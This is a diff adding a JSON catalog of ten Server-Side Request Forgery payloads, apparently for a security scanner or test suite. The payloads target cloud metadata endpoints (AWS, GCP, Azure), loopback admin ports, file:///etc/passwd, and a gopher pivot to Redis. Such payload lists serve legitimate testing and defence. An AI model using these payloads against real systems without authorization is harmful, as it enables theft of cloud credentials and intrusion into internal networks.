@@ -1,0 +1,18 @@
+{
+  "category": "Server-Side Request Forgery (SSRF)",
+  "cwe": "CWE-918",
+  "owasp": "A10:2021-Server-Side Request Forgery",
+  "description": "Standard OWASP & SecLists Server-Side Request Forgery vectors for Cloud metadata probing, internal network pivot, and protocol handler abuse.",
+  "vectors": [
+    { "id": "SSRF-001", "name": "AWS Metadata IPv4", "payload": "http://169.254.169.254/latest/meta-data/", "target": "aws_metadata", "risk": "critical" },
+    { "id": "SSRF-002", "name": "AWS Metadata IPv6", "payload": "http://[fd00:ec2::254]/latest/meta-data/", "target": "aws_metadata_v6", "risk": "critical" },
+    { "id": "SSRF-003", "name": "GCP Metadata Flavor", "payload": "http://metadata.google.internal/computeMetadata/v1/", "target": "gcp_metadata", "risk": "critical" },
+    { "id": "SSRF-004", "name": "Azure Instance Metadata", "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "target": "azure_metadata", "risk": "critical" },
+    { "id": "SSRF-005", "name": "Localhost IPv4 Loopback", "payload": "http://127.0.0.1:8080/admin", "target": "loopback_admin", "risk": "high" },
+    { "id": "SSRF-006", "name": "Localhost Alternative Notation", "payload": "http://0.0.0.0:8000/", "target": "loopback_alt", "risk": "high" },
+    { "id": "SSRF-007", "name": "Localhost Decimal Notation", "payload": "http://2130706433:8000/", "target": "loopback_decimal", "risk": "high" },
+    { "id": "SSRF-008", "name": "File Protocol Inclusion", "payload": "file:///etc/passwd", "target": "local_file", "risk": "critical" },
+    { "id": "SSRF-009", "name": "Gopher Protocol Pivot", "payload": "gopher://127.0.0.1:6379/_INFO", "target": "redis_pivot", "risk": "critical" },
+    { "id": "SSRF-010", "name": "Internal RFC1918 Private Range", "payload": "http://192.168.1.1/router", "target": "internal_gateway", "risk": "high" }
+  ]
+}
